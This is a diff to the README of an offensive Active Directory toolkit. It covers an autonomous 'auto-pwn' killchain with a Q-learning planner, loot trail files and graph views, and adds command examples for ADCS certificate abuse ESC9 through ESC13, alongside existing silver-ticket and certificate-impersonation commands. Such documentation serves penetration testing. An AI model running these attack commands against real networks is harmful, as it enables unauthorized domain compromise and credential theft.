@@ -80,7 +80,7 @@ These work on every single command:
 
 ## `ovt auto-pwn` - The "Hold My Beer" Button
 
-The full autonomous killchain. Goes from "I have creds" to "I own everything" while you watch it happen in real time. Now with **Q-Learning AI** that gets smarter every engagement and actually shows its work - every step prints the stage, noise level, Q-state, action decision (explore vs exploit), Q-value, and reward. The final report has a kill-chain completion graphic, credential tables, loot summaries, and an audit trail. No more staring at a blank terminal hoping something is happening. Supports all advanced ADCS ESC1-ESC13 attack vectors.
+The full autonomous killchain. Goes from "I have creds" to "I own everything" while you watch it happen in real time. Now with **Q-Learning AI** that gets smarter every engagement and actually shows its work - every step prints the stage, noise level, Q-state, action decision (explore vs exploit), Q-value, and reward. The final report has a kill-chain completion graphic, credential tables, loot summaries, and an audit trail. Each run also writes a single phase-wise Markdown trail under `loot/trails/overthrone_<domain>_<dc>_runNNN.md` and auto-increments instead of overwriting. No more staring at a blank terminal hoping something is happening. Supports all advanced ADCS ESC1-ESC13 attack vectors.
 
 ```bash
 # Basic - let the AI figure it out
@@ -141,11 +141,13 @@ Aliases: `ovt auto`, `ovt autopwn`
 
 The Q-Learner tracks which attacks work best in which situations and optimizes future runs. It's like Netflix recommendations, but for privilege escalation. Now it also tells you what it's thinking - every step shows the encoded state (stage/creds/DA/admins/stealth/ε), the action it chose, the Q-value backing that decision, whether it's exploring (trying new things) or exploiting (doing what worked before), and the reward it got. The final report includes a kill-chain pipeline showing which stages completed (✓) and which failed (✗), a per-stage stats table, a credential table with source and admin status, a loot summary, and the full audit trail. You can finally watch the AI work instead of trusting the vibes.
 
+In stealth mode the planner also starts with low-volume LDAP baseline and delegation probes before heavier enumeration, so the Q-learner gets useful signal without immediately spraying broad queries everywhere.
+
 ---
 
 ## `ovt wizard` - Interactive Guided Mode
 
-The autopwn with guardrails. Pauses after each stage for operator review. Supports checkpoints so you can resume if your VPN drops.
+The autopwn with guardrails. Pauses after each stage for operator review. Supports checkpoints so you can resume if your VPN drops, and writes the same single phase-wise trail file under `loot/trails/` as auto-pwn.
 
 ```bash
 # Start a new wizard session
@@ -436,7 +438,7 @@ ovt graph gui -i ./graphs/
 ovt graph gui -i ./graphs/engagement_a -i ./graphs/engagement_b
 
 # Directory inputs are indexed as selectable JSON files.
-# The GUI opens on a black canvas and renders only the selected file.
+# The GUI opens on a blank canvas, then renders searches, paths, or chunks.
 
 # Find shortest path between two nodes
 ovt graph path --from jsmith --to "Domain Admins"
@@ -457,7 +459,7 @@ ovt graph export --output graph.json
 ovt graph export --output bloodhound.json --bloodhound
 ```
 
-`ovt graph view` renders the graph canvas with compact labels when you zoom in (and always for selected/high-value nodes), while full names stay readable in the node, edge, header, and detail panels. `ovt graph tree` renders a fully interactive domain -> object type -> object -> inbound/outbound relationship tree with rich human-readable detail panes. `ovt graph gui` starts a local Rust web server, indexes directory inputs as individual JSON choices, lazy-loads and caches the selected graph, and opens a D3-powered browser UI with full node display names, render-budget controls for large graphs, search, path finder, and live stats.
+`ovt graph view` renders the graph canvas with compact labels when you zoom in (and always for selected/high-value nodes), while full names stay readable in the node, edge, header, and detail panels. `ovt graph tree` renders a fully interactive domain -> object type -> object -> inbound/outbound relationship tree with rich human-readable detail panes. `ovt graph gui` starts a local Rust web server, indexes directory inputs as individual JSON choices, and opens a D3-powered browser UI that starts blank like BloodHound. Search boxes provide realtime source/destination suggestions, object-type filters narrow users/computers/groups/domains/GPOs/OUs/templates/CAs, path results render only the relevant nodes, and chunk budgets support `50`, `100`, `200`, `300`, `500`, `1000`, `2000`, `5000`, or `ALL` with an explicit warning prompt.
 
 ---
 
@@ -546,7 +548,7 @@ ovt forge silver --domain-sid S-1-5-21-1234... --service-hash <32hex> \
 
 ---
 
-## `ovt adcs` - ADCS Certificate Abuse (ESC1-ESC8)
+## `ovt adcs` - ADCS Certificate Abuse (ESC1-ESC13)
 
 Aliases: `ovt certify`
 
@@ -580,6 +582,23 @@ ovt adcs esc7 --ca CA01
 
 # ESC8 - NTLM relay to web enrollment
 ovt adcs esc8 --url https://ca01.corp.local/certsrv --target-user Administrator
+
+# ESC9 - No Security Extension + UPN poisoning
+ovt adcs esc9 --ca CA01 --template NoSecExt --target-upn Administrator@corp.local \
+  --victim jsmith --original-upn jsmith@corp.local
+
+# ESC10 - Weak certificate mapping
+ovt adcs esc10 --ca CA01 --template User --target-upn Administrator@corp.local --variant a
+
+# ESC11 - NTLM relay to ICPR
+ovt adcs esc11 --ca-host ca01.corp.local --ca-name CORP-CA01 --template User
+
+# ESC12 - CA private key extraction guidance
+ovt adcs esc12 --ca-host ca01.corp.local --ca-name CORP-CA01 --operator Administrator
+
+# ESC13 - Issuance policy OID linked to privileged group
+ovt adcs esc13 --ca CA01 --template PolicyTemplate --policy-oid 1.2.3.4 \
+  --linked-group-dn "CN=Domain Admins,CN=Users,DC=corp,DC=local"
 
 # Request a certificate manually
 ovt adcs request --ca CA01 --template User --san "administrator@corp.local" -o cert.pfx
